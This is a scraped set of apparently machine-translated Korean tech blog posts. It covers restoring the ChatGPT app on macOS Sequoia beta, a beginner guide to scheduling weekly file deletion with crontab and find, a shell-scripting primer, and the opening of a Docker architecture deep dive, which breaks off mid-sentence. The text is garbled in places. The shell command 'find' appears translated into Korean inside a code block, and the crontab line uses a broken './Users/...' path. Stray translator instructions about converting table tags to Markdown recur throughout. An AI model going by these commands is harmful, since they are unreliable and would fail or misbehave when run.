키보드와 마우스를 사용하여 아이폰 앱을 제어할 수 있습니다.\n- Safari 기능 업그레이드: \"하이라이트\"와 같은 기능을 통해 기계 학습을 사용하여 웹 페이지에서 관련 정보를 강조하고, 기사에 대한 요약과 목차를 제공하는 최신 \"리더\" 기능 등이 있습니다.\n- 창 타일링: 화면에 창을 자동으로 정리하여 멀티태스킹이 더 편리해집니다.\n- 암호 앱: 키체인을 대체하는 새로운 앱으로, 암호와 보안 키를 Apple 기기 전반에 걸쳐 관리하고 동기화하기 쉽게 합니다.\n- AI 및 기계 학습: Safari, Siri 및 노트와 같은 기능을 향상시키기 위해 AI를 더 깊게 통합한 것으로, Apple Intelligence와 OpenAI ChatGPT 4.0을 활용합니다.\n\nmacOS Sequoia는 Apple 실리콘 (M1, M2 등)을 탑재한 모든 기기와 iMac Pro (2017) 및 MacBook Pro (2018)과 같은 일부 오래된 인텔 기반 모델과 호환됩니다.\n\n호환성 문제\n\n첫 사용자이자 개발자로서 저는 기술의 최전선에 머무르려고 항상 노력합니다. 그러나 이번에는 OpenAI가 개발한 음성 채팅 기능이 포함된 ChatGPT 앱이 ChatGPT 로고만 있는 링크로 대체되었습니다. 처음에는 이것이 Apple과 OpenAI 사이의 통합의 일환인 줄 알았지만, 실망스러운 사실을 발견하게 되었습니다. 게다가, 저의 이전에 사용하던 기능적인 앱이 삭제되었습니다.\n\n<div class=\"content-ad\"></div>\n\n해결책\n\nChatGPT를 일찍 사용한 충실한 고객으로서, 베타 버전에 일찍 접속할 수 있었는데, 그 때는 완벽히 작동했어요. 이메일 아카이브를 절반 시간 동안 검색해보았지만, 포함된 베타 버전의 이메일을 찾을 수 없었어요.\n\n그 후 온라인으로 검색하여 OpenAI의 다운로드 페이지를 찾았어요: OpenAI ChatGPT 다운로드.\n\n다운로드는 원활히 진행되었지만, 앱을 설치하려고 할 때 문제가 발생했어요. macOS에서 ChatGPT_Desktop_public_latest.dmg 파일을 열 수 없었습니다. 대신 DAEMON Tools를 사용하여 이미지를 열어야 했어요. 그러면 앱을 Applications 폴더로 끌어다 놓을 수 있었어요. 이전 앱을 덮어쓸 것인지 확인하는 메시지가 나왔을 때, 그렇게 하려고 했지만 작동하지 않았어요. 기능이 있는 이전 앱을 추가하기 위해 둘 다 유지하도록 수락해야 했어요.\n\n<div class=\"content-ad\"></div>\n\n![이미지](/assets/img/2024-06-19-HowtoGettheOriginalChatGPTAppbyOpenAIWorkingAgainonmacOSSequoiaBetaRelease1_0.png)\n\n결론\n\n이 문제는 향후 업데이트로 해결될 것으로 예상되지만, 현재로서는 제가 찾은 해결책입니다. 이 가이드가 동일한 문제를 겪을 수 있는 다른 사람들에게 도움이 되고, 작동 중간 솔루션을 찾는 데 내가 소비한 시간을 절약해 드리기를 바랍니다.\n\n행동 요구\n\n<div class=\"content-ad\"></div>\n\n비슷한 문제를 겪은 적이 있거나 추가 팁이 있다면, 아래 댓글에 여러분의 경험을 공유해 주세요. 함께 macOS 업그레이드를 최대한 활용하도록 서로 도와줍시다!","ogImage":{"url":"/assets/img/2024-06-19-HowtoGettheOriginalChatGPTAppbyOpenAIWorkingAgainonmacOSSequoiaBetaRelease1_0.png"},"coverImage":"/assets/img/2024-06-19-HowtoGettheOriginalChatGPTAppbyOpenAIWorkingAgainonmacOSSequoiaBetaRelease1_0.png","tag":["Tech"],"readingTime":2},{"title":"리눅스의 Crontab 오래된 파일 삭제 일정 설정 초보자 가이드","description":"","date":"2024-06-19 01:02","slug":"2024-06-19-CrontabinLinuxBeginnersGuidetoScheduletheDeletionofOutdatedFiles","content":"\n\n![Image](/assets/img/2024-06-19-CrontabinLinuxBeginnersGuidetoScheduletheDeletionofOutdatedFiles_0.png)\n\n## 우리의 시나리오:\n\n고객이 서비스의 디스크 공간이 100%로 가득찬 것을 알아차리고, 가장 쉬운 솔루션은 공급자 캐시였습니다. 이 캐시에는 PR에서 사용된 모든 공급자 버전이 포함되어 있으며 매주 안전하게 삭제할 수 있습니다.\n\n크론 작업을 설정하여 매주 월요일 오전 7시에 실행하고 폴더에서 파일을 삭제하십시오. 폴더 자체는 삭제하지 않도록 주의하십시오.\n\n<div class=\"content-ad\"></div>\n\n시작해 봅시다!\n\n## Cron 소개\n\nCron은 리눅스 환경에서 사용자가 일정 시간에 반복적으로 작업을 예약할 수 있게 해주는 응용 프로그램입니다. Cron은 주로 예약된 백업 실행, 디스크 공간 모니터링, 파일 삭제, 시스템 유지 보수 작업 실행 등에 사용됩니다.\n\nCron 작업을 사용하면 서버에서 특정 작업을 예약하고 실행할 수 있습니다. Cron 작업은 백그라운드에서 실행되는 작업을 자동화하는 데 사용됩니다.\n\n<div class=\"content-ad\"></div>\n\n대부분의 cron 작업에는 세 가지 구성 요소가 있습니다:\n\n- 호출하거나 실행할 스크립트입니다.\n- 주기적으로 스크립트를 실행하는 명령입니다.\n- 호출되는 스크립트가 하는 작업 또는 출력이 있습니다. 일반적으로 스크립트는 파일이나 데이터베이스를 수정합니다. 그러나 서버의 데이터를 수정하지 않는 다른 작업도 수행할 수 있습니다. 예를 들어 이메일 알림을 보내는 등의 작업이 있을 수 있습니다.\n\n한 개의 Cron 작업 개체는 crontab(크론 테이블) 파일의 한 줄과 같습니다. 지정된 일정에 주기적으로 작업을 실행하며, 크론 형식으로 작성됩니다. \n\nCrontab 구문에는 다음과 같은 다섯 가지 필드가 포함되며 가능한 값을 가집니다:\n\n<div class=\"content-ad\"></div>\n\n- 분. 명령이 실행될 시간(0–59 사이)을 나타냅니다.\n- 시간. 명령이 실행될 시간(24시간제, 0–23 사이)을 나타냅니다.\n- 월별 날짜. 명령이 실행될 날짜(1–31 사이)를 나타냅니다.\n- 월. 명령이 실행될 월(1–12 사이, 즉 1월부터 12월까지)을 나타냅니다.\n- 요일. 명령이 실행될 요일(0–6 사이, 일요일부터 토요일까지)을 나타냅니다. 일부 시스템에서 값 7은 일요일을 나타냅니다.\n- 별표(*)는 해당 필드의 모든 값을 나타냅니다. 예를 들어, 4번째 필드(월)에 별표를 사용하면 매월을 의미합니다.\n\n중요: 필드를 비워두지 마세요.\n\n<img src=\"/assets/img/2024-06-19-CrontabinLinuxBeginnersGuidetoScheduletheDeletionofOutdatedFiles_1.png\" />\n\n## 크론 제한사항:\n\n<div class=\"content-ad\"></div>\n\n- 작업 간 최단 간격은 60초입니다. cron을 사용하면 59초 미만으로 작업을 실행할 수 없습니다.\n- 한 대의 컴퓨터에 집중화되어 있습니다. cron 작업을 네트워크 내의 여러 대의 컴퓨터로 분산할 수 없습니다. 그러므로 cron을 실행하는 컴퓨터가 충돌하면 예약된 작업이 실행되지 않고 누락된 작업을 수동으로만 실행할 수 있습니다.\n- 자동 재시도 메커니즘이 없습니다. cron은 엄격히 지정된 시간에 실행되도록 설계되었습니다. 작업이 실패하면 다음 예약된 시간까지 다시 실행되지 않습니다. 이로 인해 cron은 점진적 작업에 적합하지 않습니다.\n\n이러한 제한 사항으로 인해 cron은 특정 시간에 정기적인 간격으로 실행되는 간단한 작업에는 훌륭한 솔루션입니다.\n\n## cron이 수행할 수 있는 기본 작업:\n- crontab -e: crontab 파일을 생성 또는 편집합니다. 시스템에 crontab 파일이 없는 경우 해당 명령은 자동으로 새 파일을 생성합니다. crontab -e를 사용하면 cron 작업을 추가, 편집 및 삭제할 수 있습니다.\n- crontab -l: 시스템에 있는 활성 예약된 작업 목록을 볼 수 있습니다.\n- crontab -u username -l: 시스템에 여러 사용자가 있는 경우 su를 입력하여 해당 명령으로 사용자의 crontab 파일 목록을 볼 수 있습니다.\n- sudo su crontab -u username -e: 다른 사용자의 예약된 작업을 편집합니다. 루트 권한을 부여하려면 명령의 시작 부분에 sudo su를 추가하십시오. 이 명령을 포함한 일부 명령은 관리자 사용자만 실행할 수 있습니다.\n- crontab -r: crontab 파일의 모든 예약된 작업을 삭제하고 새로 시작합니다.\n- crontab -i: 해당 명령은 crontab -r과 동일하지만 사용자에게 crontab을 제거하기 전에 yes/no 옵션을 제시합니다.\n- man crontab: cron의 매뉴얼 페이지\n\n<div class=\"content-ad\"></div>\n\n# 1| 명령어 테스트\n\n크론 작업을 예약하기 전에 명령을 테스트하기 위해 몇 가지 파일이 들어 있는 새 디렉토리를 만들어 보겠습니다:\nmkdir: 새 디렉토리 만들기에 사용됩니다\ntouch: 일반 파일 생성에 사용됩니다\n\n![이미지](/assets/img/2024-06-19-CrontabinLinuxBeginnersGuidetoScheduletheDeletionofOutdatedFiles_2.png)\n\n이제 test_script의 모든 파일을 삭제해 보겠습니다. 실행할 명령어는 다음과 같습니다:\n\n<div class=\"content-ad\"></div>\n\n```js\n$ 찾기 ./test_script -mindepth 1 -delete\n```\n\nfind 명령어는 파일의 이름을 입력하여 특정 파일을 검색할 수 있습니다. -name 옵션을 사용하여 원하는 파일 이름을 입력한 후 find 명령어를 사용할 수 있습니다.\n\nmaxdepth vs. mindepth:\n-maxdepth levels\n시작점 아래의 디렉토리에서 최대 levels(0 이상의 정수)까지 이동합니다. -maxdepth 0은 시작점 자체에 대해 테스트 및 작업을 적용합니다.\n\n-mindepth levels\nlevels(0 이상의 정수)보다 작은 수준에서는 어떤 테스트나 작업도 적용하지 않습니다. -mindepth 1은 시작점을 제외한 모든 파일을 처리합니다.\n\n\n<div class=\"content-ad\"></div>\n\n아래 화면 캡처에서 확인할 수 있듯이 스크립트가 정확히 작동했습니다! 성공!\n\n## 2. 스크립트 만들기\n\n시작하려면 Step 1에서 한 것과 똑같은 단계를 따를 것입니다. 폴더 내에 디렉터리를 만들고 더미 파일을 생성하세요. 이번에는 다른 이름으로 만들어 보겠습니다!\n\n<div class=\"content-ad\"></div>\n\n다음으로, vim을 사용하여 동일한 스크립트를 사용하여 파일을 삭제할 수 있는 스크립트를 만듭니다.\n\n<img src=\"/assets/img/2024-06-19-CrontabinLinuxBeginnersGuidetoScheduletheDeletionofOutdatedFiles_5.png\" />\n\n리눅스에서 스크립트를 실행 가능하게 하려면 \"chmod\" 명령을 사용하여 파일에 \"실행\" 권한을 할당하십시오.\n\n<div class=\"content-ad\"></div>\n\n표 태그를 마크다운 형식으로 변경하면 됩니다.\n\n```js\n$ chmod u+x script\n\n또는 \n\n$ chmod 744 script\n```\n\n<img src=\"/assets/img/2024-06-19-CrontabinLinuxBeginnersGuidetoScheduletheDeletionofOutdatedFiles_6.png\" />\n\n자, 이제 스크립트를 실행해보고 제대로 작동하는지 확인해봅시다!\n\n<div class=\"content-ad\"></div>\n\n아래 Markdown 형식으로 table 태그를 변경하세요.\n\n\n<img src=\"/assets/img/2024-06-19-CrontabinLinuxBeginnersGuidetoScheduletheDeletionofOutdatedFiles_7.png\" />\n\n성공입니다! 모든 것이 파일에서 지워졌고 실제 파일은 삭제하지 않았습니다! 이제 마지막 퍼즐 조각으로 넘어가 봅시다!!\n\n# 3| Cron 작업 추가\n\n다시 한 번, 위와 같은 단계를 따라하여 폴더 내에 파일을 생성하실 겁니다.\n\n\n<div class=\"content-ad\"></div>\n\n아래는 Markdown 형식으로 표를 표시합니다.\n\n\n![Crontab Image 8](/assets/img/2024-06-19-CrontabinLinuxBeginnersGuidetoScheduletheDeletionofOutdatedFiles_8.png)\n\n다음으로, 매주 월요일 오전 7시에 실행되는 cron 작업을 만들어야 합니다. 이를 위해 https://crontab-generator.org/ 로 이동하여 약간의 안내를 받겠습니다.\n\n![Crontab Image 9](/assets/img/2024-06-19-CrontabinLinuxBeginnersGuidetoScheduletheDeletionofOutdatedFiles_9.png)\n\n다음 명령을 실행하여 crontab을 엽니다:\n\n\n<div class=\"content-ad\"></div>\n\n```js\n$ crontab -e\n```\n\n파일의 맨 끝에 다음 줄을 추가하세요:\n\n```js\n0 7 * * 1 ./Users/kparham/cron_test_folder/cron_delete_files.sh >/dev/null 2>&1\n```\n\n˚*•̩̩͙✩•̩̩͙*˚＊성공!!!! ＊ ˚*•̩̩͙✩•̩̩͙*˚\n\n<div class=\"content-ad\"></div>\n\n마크다운 형식으로 테이블 태그를 변경해주세요.","ogImage":{"url":"/assets/img/2024-06-19-CrontabinLinuxBeginnersGuidetoScheduletheDeletionofOutdatedFiles_0.png"},"coverImage":"/assets/img/2024-06-19-CrontabinLinuxBeginnersGuidetoScheduletheDeletionofOutdatedFiles_0.png","tag":["Tech"],"readingTime":5},{"title":"쉘 스크립팅","description":"","date":"2024-06-19 01:00","slug":"2024-06-19-ShellScripting","content":"\n\n셸 스크립팅이란 무엇인가요?\n\n터미널에 리눅스 명령어를 입력하는 것과 마찬가지로, 텍스트 파일에 명령어들을 나열하고 그 파일의 확장자를 .sh로 지정하여 실행할 수 있습니다.\n\n셸 스크립팅을 사용하면 파일 관리 작업 등 리눅스의 작업을 자동화할 수 있습니다.\n\n서버에서 파일을 백업하는 것과 같이 일상적인 작업에서 인간의 노력을 줄여줄 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n종류별 쉘:\n\n보른 쉘(sh):\n\n일부 시스템에서 기본 해석기지만, 많은 현대 리눅스 배포판에서는 \"dash\" 등 다른 쉘로의 심볼릭 링크로 대체됩니다.\n\n이식 가능하고 대부분 선호되는 쉘입니다. 그러나 산술 및 논리 표현 처리 등 일부 고급 기능이 부족합니다.\n\n<div class=\"content-ad\"></div>\n\nC 셸 (csh):\n\nC 언어에서 영감을 받았지만 bash보다는 오늘날에는 사용량이 적습니다. 그러나 일부 사용자들은 그 문법을 선호합니다.\n\nTENEX C 셸 (tcsh):\n\n철자 교정 및 프로그래밍 가능한 단어 완성과 같은 고급 기능을 갖춘 C 셸의 확장판입니다.\n\n<div class=\"content-ad\"></div>\n\nC 셸 사용자에게 친숙한 경험을 제공하면서 추가 기능이 있습니다.\n\nZ 셸:\n\n더 많은 고급 기능 및 플러그인 지원과 더 많은 사용자 정의 옵션을 갖춘 bash 셸의 확장입니다.\n\n효율적인 셸과 매우 구성 가능한 환경을 원하는 사용자들 사이에서 인기가 있습니다.\n\n<div class=\"content-ad\"></div>\n\n셸의 여러 종류가 있어요. 우리의 필요와 선호에 따라 그 중에서 선택할 수 있어요.\n\n셸 스크립팅 기초:\n\n사용자 입력을 어떻게 받을까요?\n\n![이미지](/assets/img/2024-06-19-ShellScripting_0.png)\n\n<div class=\"content-ad\"></div>\n\n위 이미지에서 볼 수 있듯이, 우리는 사용자로부터 입력을 받기 위해 \"read\"를 사용할 수 있습니다.\n\n이 스크립트는 두 개의 숫자를 입력으로 받고 그것들을 출력으로 출력합니다.\n\n입력으로 어떤 숫자를 주면, 그들은 변수 num1과 num2에 저장됩니다.\n\necho 명령어에서 변수를 출력하려면 변수 앞에 \"$\" 기호를 사용해야 합니다.\n\n<div class=\"content-ad\"></div>\n\n\n![스크립트 실행 전 사용자 입력을 받을 수 있습니다](/assets/img/2024-06-19-ShellScripting_1.png)\n\n스크립트 실행 전에 사용자 입력을 받을 수 있습니다.:\n\n![스크립트 실행 전 사용자 입력 받기](/assets/img/2024-06-19-ShellScripting_2.png)\n\n여기서 num1=$1은, 우리가 bash scriptname.sh라는 명령어로 스크립트를 실행할 때 변수에 값을 제공할 것으로 예상됩니다.\n\n\n<div class=\"content-ad\"></div>\n\n저의 스크립트 이름을 med.sh로 지었기 때문에 이 bash med.sh value1 value2를 따를 수 있어요. 이렇게 하면 두 값이 num1과 num2에 할당됩니다.\n\n![image](./assets/img/2024-06-19-ShellScripting_3.png)\n\n변수의 또 다른 사용 사례를 살펴보죠:\n\n아래 이미지처럼 쉘에서 \"t\"라는 변수를 값 10으로 초기화해 봅시다.\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-06-19-ShellScripting_4.png)\n\n출력할 수 있을까요? echo 명령어로 시도해 봅시다:\n\n![이미지](/assets/img/2024-06-19-ShellScripting_5.png)\n\necho 문이 작동하고 변수 값이 출력된 것을 확인할 수 있었어요. 이제 스크립트로 시도해 볼게요:\n\n\n<div class=\"content-ad\"></div>\n\n\n![ShellScripting_6](/assets/img/2024-06-19-ShellScripting_6.png)\n\n![ShellScripting_7](/assets/img/2024-06-19-ShellScripting_7.png)\n\nIt gives nothing, because variable \"t\" is not global. So, to make it global, we should export the variable with the command `export t`.\n\n![ShellScripting_8](/assets/img/2024-06-19-ShellScripting_8.png)\n\n\n<div class=\"content-ad\"></div>\n\n위와 같이 보시다시피, 스크립트 내 echo 문은 \"t\" 값을 출력할 수 있습니다.\n\nFor 루프:\n\n![이미지](/assets/img/2024-06-19-ShellScripting_9.png)\n\n여기에서 for 루프는 C 언어로 작성한 것과 동일합니다. 이 스크립트는 변수 n의 값들을 출력합니다. 매 반복마다 조건 n≤5를 확인하며, 참이면 해당 값을 출력합니다.\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-06-19-ShellScripting_10.png)\n\nbash 배열을 만드는 방법은 무엇인가요?\n\nBash 배열은 매우 특별합니다. 다른 프로그래밍 언어와 달리 문자열, 정수 등과 같은 다양한 유형의 요소를 저장할 수 있습니다.\n\n구문: array_name=()\n\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-19-ShellScripting_11.png\" />\n\n여기에서 우리는 gokul이라는 배열을 만들었고, 그 안에 값을 넣었습니다.\n\n그리고 for 루프를 사용하여 배열을 반복하고 해당 값을 출력할 수 있습니다.\n\n'gokul[@]'은:\n\n<div class=\"content-ad\"></div>\n\ngokul은 우리가 참조하는 배열 이름입니다. @는 중괄호 내부에 있는 특수한 자리 표시자로, 배열을 공백으로 구분된 개별 요소로 확장하는 역할을 합니다. 'gokul[*]'도 사용할 수 있습니다.\n\n![image](/assets/img/2024-06-19-ShellScripting_12.png)\n\n함수:\n\n함수를 사용하여 입력된 숫자를 더하고 빼고 나누는 스크립트를 만들어 봅시다.\n\n<div class=\"content-ad\"></div>\n\n\nsyntax : function_name()' — — — — — Code — — — — -'\n\nfunction_name 함수를 통해 해당 함수를 필요한 곳 어디서든 호출할 수 있습니다.\n\n<img src=\"/assets/img/2024-06-19-ShellScripting_13.png\" />\n\n저희는 각각 덧셈, 뺄셈, 나눗셈을 위한 sum, sub, div 3개의 함수를 생성했습니다.\n\n\n<div class=\"content-ad\"></div>\n\n위 함수 안에는 위 스크립트에 표시된 대로 논리 연산을 수행하는 논리가 포함되어 있습니다. 그리고 결과가 출력됩니다.\n\nread 명령어를 사용하여 입력값으로 2개의 숫자를 받고, read 명령어에 -p를 사용하여 콘솔에 인쇄할 메시지를 호출할 수 있습니다.\n\n그리고 입력 받은 두 변수를 모든 함수에 전달하기 위해 각각의 이름을 호출합니다.\n\n![이미지](/assets/img/2024-06-19-ShellScripting_14.png)\n\n<div class=\"content-ad\"></div>\n\nCase :\n\n테이블 태그를 마크다운 형식으로 변경하면 됩니다.\n\n\\\nIt allows you to compare an expression against a list of patterns and execute specific code blocks based on the match.\n\\\n\nLets see example below.\n\n![Shell Scripting Example](/assets/img/2024-06-19-ShellScripting_15.png)\n\n<div class=\"content-ad\"></div>\n\n스크립트는 기분 조건을 인수로 사용합니다.\n\n- case 문은 기분 변수를 다른 패턴과 비교합니다.\n- \"Happy\", \"Sad\", 또는 \"Depressed\"와 일치하는 경우 해당 코드 블록이 실행됩니다.\n\n그리고 \"esac\"은 case의 반대로, case 블록의 끝을 나타냅니다.","ogImage":{"url":"/assets/img/2024-06-19-ShellScripting_0.png"},"coverImage":"/assets/img/2024-06-19-ShellScripting_0.png","tag":["Tech"],"readingTime":5},{"title":"도커는 실제로 어떻게 작동하나요 하드웨이 포괄적인 기술적 심층 탐구","description":"","date":"2024-06-19 00:52","slug":"2024-06-19-HowdoesDockerACTUALLYworkTheHardWayAComprehensiveTechnicalDeepDiving","content":"\n\n도커. 컨테이너. 오케스트레이션의 혁명. 산업을 선도하는 PaaS 제품. 빌드, 공유 및 실행. 어떤 앱이든 어디에서든... 그냥 그렇게. “도커는 어떻게 작동할까?”라고 궁금해 해 본 적 있나요? 마법이 아니에요. 재능과 땀 머금은 기술이랍니다.\n\n![이미지](/assets/img/2024-06-19-HowdoesDockerACTUALLYworkTheHardWayAComprehensiveTechnicalDeepDiving_0.png)\n\n이 기사에서는 다음 질문에 대한 답을 찾아보겠습니다:\n\n- 컨테이너화가 세계를 어떻게 바꿨는가?\n- 컨테이너가 클라우드 생태계를 어떻게 장악했는가?\n- “컨테이너”가 정확히 무엇을 의미하는가?\n- “도커”는 실제로 무엇인가요?\n\n<div class=\"content-ad\"></div>\n\n본 기사의 목적은 \"도커\"에 대해 더 많이 배우고 이해하고 싶어하는 개발자들을 위해 고수 수준에서 초보 수준까지 포괄적인 학습 경로를 만드는 것입니다. 대상 독자는 다음을 원하는 분들입니다:\n\n- 도커가 내부적으로 어떻게 사용되는지 배우기\n- 컨테이너화에 대해 깊게 이해하기\n- 구성 요소 간의 관계 파악하기\n- 전반적인 멘탈 모델 습득하기\n- 전체적인 그림을 보기\n\n4년 전에는 컨테이너에 대해 거의 아무것도 몰랐습니다. 요즘에는 컨테이너 세계에 푹 빠져 있습니다. 4년 간의 지식을 한 자리에 모아 도커에 관심이 있는 모든 분들이 정렬되어 있도록 도와주기로 결심했습니다. 저는 4년 이상 Trendyol에서 컨테이너에 청년했습니다. \n\n# 이 기사를 읽는 방법\n\n<div class=\"content-ad\"></div>\n\n이 기사는 조금 길 수 있습니다. 여기에서는 읽는 방법에 대한 안내가 있습니다:\n\n- 높은 수준의 개요로 시작하여 컨셉을 간단히 설명합니다.\n- 그런 다음 디자인 세부 정보를 소개하면서 전체 개념을 설명합니다.\n- 높은 수준의 디자인이 완전히 설명된 후에는 일부 구성 요소를 살펴보고 구현과 관련된 몇 가지 이슈와 PR을 제공하며, 기사와 저자에 대한 교차 참조를 제공합니다.\n- 이어서 내부의 저평가된 구성 요소, 명세, 뒷면, 내부 세부 정보에 대한 깊은 탐구를 합니다.\n- 기사를 기존 정리하며 다룬 주요 포인트를 요약합니다.\n\n# 노트\n\n- 버즈워드 주의: 외부 소스 및 중요 키워드에 대한 교차 참조가 많이 나옵니다. 각각은 자세히 살펴볼 가치가 있습니다.\n- No-AI: 이 문서에는 GPT 또는 AI로 생성된 내용이 포함되어 있지 않습니다! 커피를 한 잔 들고 즐겁게 읽으세요!\n- 그림: 모든 그림은 저가 Excalidraw에서 직접 그린 것이며, 모든 권리를 보유합니다.\n\n<div class=\"content-ad\"></div>\n\n# 개요\n\n최근 몇 년 동안 컨테이너 관련 기술은 몇 가지 명령어로 빠르게 소프트웨어를 전달하기 위해 다양한 맥락에서 사용되어왔습니다. 본 문서는 컨테이너화 기술을 깊이 있게 개념화하고 검토합니다. 특정 용어들을 단계적으로 설명하고, 전반적인 아키텍처, 동기 및 사고 모델을 설명합니다. 우리는 Docker 아키텍처와 구성 요소를 질적으로 조사합니다. 본 문서에서는 모든 작은 세부사항을 다루지 않겠지만, 대신 뒷면에서 무슨 일이 일어나는지에 대해 알려드릴 것입니다. 이 문서에서는 많은 언급, 외부 리다이렉션, 교차 참조가 있을 것입니다.\n\n# 동기\n\n객관적으로 양적으로 측정하기 어려우며 주관적 해석에 크게 개방되어 있지만, 원숭이처럼 문서를 뛰어넘는 것보다 더 유익한 것은 전체 코드베이스를 이해하는 것입니다. 우리가 엔지니어로써 미래를 구축하려는 길에 있다면, 우리가 사용하는 기술이 어떻게 만들어졌는지 알아야 한다고 생각합니다. 누가 만들었는지. 어디에서. 어떻게. 그래서 어떠한 것이든 깊게 파고들어야 하는데, 아무데서나 어디서든지요.\n\n<div class=\"content-ad\"></div>\n\n컨테이너 세계에 심취해본 적이 없어요. 여기서 중요한 점은 교육적인 목적으로 무언가를 할 수 있는 능력을 갖추는 것이며, 전체 아키텍처를 이해하고 모든 다양한 맥락을 하나의 장소에 편하게 정리하는 것입니다! 함께, 우리는 이를 하는 법을 배우게 될 거예요. 게다가, 이 편지를 쓰며 가치 있는 정보를 배울 수 있을 거예요. 게다가, 이는 기여할 수 있는 좋은 기회가 될 수 있어요. 커뮤니티에서 새로운 사람들을 만나고, 뒷담화를 듣는 분들, 건축가들, 의사 결정을 내리는 사람들도 만날 수 있는 기회일 거예요!\n\n기술은 변화합니다. 늘 그렇죠. 우리의 지식이 바로 우리의 가치입니다. 최신 기술 변화와 업데이트를 따라가야 합니다. 그래서, 암기 대신에 이해하고, 듣는 대신에 보고, 무시하는 대신에 배우고, 가정 대신에 증명해 봅시다. 이러한 동기 부여는 여기서부터 더 나아갈 충분한 이유가 될 거예요!\n\n# 1. 소개\n\n컨테이너는 오늘날 인프라에서 언어를 제공하는 정말 유용한 존재가 되었어요. 다양한 환경의 복잡성을 초월하며 매끄러운 배포와 확장성을 제공하는 보편적인 언어를 제공하죠. 가벼우면서도 모듈식 디자인 덕분에 컨테이너는 응용 프로그램과 그 의존성을 캡슐화하여 다양한 플랫폼 간의 일관성과 이식성을 보장합니다. 컨테이너의 채택은 계속해서 급격히 증가하며 오늘날의 동적이고 빠른 기술적 환경에서 응용 프로그램이 개발되고 배포되고 관리되는 방식을 재정의하고 있습니다.\n\n<div class=\"content-ad\"></div>\n\n우리가 애플리케이션을 개발, 배포 및 실행하는 방식을 혁신한 솔루션 중 하나가 Docker입니다. 소프트웨어를 컨테이너라고 불리는 자체 포함 단위로 패키징할 수 있는 능력으로, Docker는 소프트웨어 개발 및 배포의 세계를 변화시켰습니다.\n\nDocker가 부상하는 원동력과 개발자, 운영팀 및 모든 크기의 기관들 사이에서 엄청난 인기를 얻게 된 이유를 알아봅시다.\n\n## 2. Docker란?\n\nDocker는 컨테이너 내부에서 애플리케이션을 개발, 배포 및 실행하기 위한 오픈 플랫폼입니다. Docker는 컨테이너화 기술을 활용하여 애플리케이션을 생성, 배포 및 실행하는 프로세스를 간소화합니다. Docker를 사용하면 애플리케이션을 인프라에서 분리하여 소프트웨어를 신속하게 전달할 수 있습니다. Docker를 통해 인프라와 애플리케이션을 동일한 방식으로 관리할 수 있습니다. Docker는 기저 인프라를 추상화하고 소프트웨어를 패키징하고 배포하는 표준화된 방법을 제공합니다. Docker의 배포, 테스트 및 코드 신속 배포 방법을 활용하여 코드 작성과 프로덕션에서 실행 간의 지연을 크게 줄일 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n## 2.1. 컨테이너의 부상\n\n지난 수십 년 동안 거의 모든 소프트웨어 애플리케이션들은 큰 단일 모노리틱으로 구축되었습니다. 목표는 모든 과정과 모든 기능을 하나의 서비스 내에서 처리하는 것이었습니다. 전체 시스템은 단일 시스템 방식으로 관리되고 사용되었기 때문에 모노리틱 빌드가 드물게 업데이트되었던 것입니다. 모든 시스템은 동시에 패키징되어 운영팀에 전달되어야 했습니다. 전체 시스템은 건강 서비스를 개발하고 모니터링한 운영팀에 의해 완전하게 운영되었습니다. 이 유산 방식은 여전히 소규모 프로젝트와 팀에 사용되고 있습니다.\n\n배포하는 데 어려움을 겪고 새로운 기능에 대응하지 못하는 오래된 구조는 개발자들이 새로운 서비스 디자인을 찾도록 강요하게 만들었습니다. 이 때, 마이크로서비스가 나타납니다. 마이크로서비스 아키텍처는 사실 상을 더 작은 부분으로 분할한 모노리틱 구조입니다. 모든 서비스가 독립적으로 작동합니다. 마이크로서비스는 서로 분리되어 실행되며, 개별적으로 업데이트, 활용 및 확장될 수 있습니다. 이것은 개발팀과 운영팀이 소프트웨어를 최신 상태로 유지하고 제품을 신속히 배포할 수 있는 기회를 제공합니다. 이러한 구조를 사용하는 회사의 수는 날이 갈수록 증가하고 있습니다. 넷플릭스, 구글, 아마존 등이 가장 일반적으로 사용하는 사용자입니다.\n\n마이크로서비스에는 긍정적인 측면이 있지만, 작은 서비스의 수가 더 많아지면서 업무량이 증가하고 이를 하나의 소프트웨어처럼 제어하고 병합하기가 어려워집니다. 이를 원활하게 운영하고 하드웨어 비용을 절감하는 것이 훨씬 어려워집니다. 그 때, 운영팀의 임무는 인간의 실수나 실패를 방지하고 확장 가능한 소프트웨어를 개발하기 위해 자동화를 극대화하는 것입니다. [17]\n\n<div class=\"content-ad\"></div>\n\n## 2.2. 컨테이너 대 가상 머신\n\n가상화는 컴퓨터 시스템의 가상 인스턴스를 하드웨어 시스템으로부터 추상화된 레이어에서 실행하는 프로세스입니다. 가상화는 가상 머신(Virtual Machines)을 통해 한 컴퓨터에서 동시에 여러 가상 운영 체제를 실행할 수 있도록 한다.\n\n가상 머신(VMs)은 하나의 서버를 여러 대로 변환하는 물리 하드웨어의 추상화입니다. VM은 하나의 기계에서 여러 VM을 실행할 수 있게 한다. 각 VM은 완전한 운영 체제, 응용 프로그램, 필요한 바이너리 및 라이브러리 및 모든 종속성을 포함한다. 각 VM을 관리하고 구성해야 하기 때문에 VM은 비용을 절감하고 낭비되는 하드웨어 자원을 피하는 최선의 방법은 아니다. 이러한 이유로 가상화에서 컨테이너 기술로의 이전이 날이 갈수록 증가하고 있다.\n\n리눅스 컨테이너 기술은 각 서비스에 대해 별도의 환경을 준비하지 않고도 개발자들이 동일한 기계에서 여러 마이크로서비스를 실행할 수 있게 한다. 또한 컨테이너를 사용하여 서로를 격리시킬 수 있다.\n\n<div class=\"content-ad\"></div>\n\n\"Learning Containers From The Bottom Up\" 기사를 읽어보세요. 그 기사는 컨테이너 학습 경로를 제시합니다.\n\n\n![2024-06-19-HowdoesDockerACTUALLYworkTheHardWayAComprehensiveTechnicalDeepDiving_1](/assets/img/2024-06-19-HowdoesDockerACTUALLYworkTheHardWayAComprehensiveTechnicalDeepDiving_1.png)\n\n\n## 3. Docker 아키텍처\n\n도커 아키텍처는 클라이언트-서버 모델로, 컨테이너화된 응용 프로그램의 생성, 배포, 및 배포를 가능하게 합니다.\n\n<div class=\"content-ad\"></div>\n\n## 3.1. 고수준 아키텍처\n\n도커의 고수준 아키텍처는 클라이언트-서버 모델을 중심으로 구성되어 있습니다. 여기서 클라이언트는 컨테이너 및 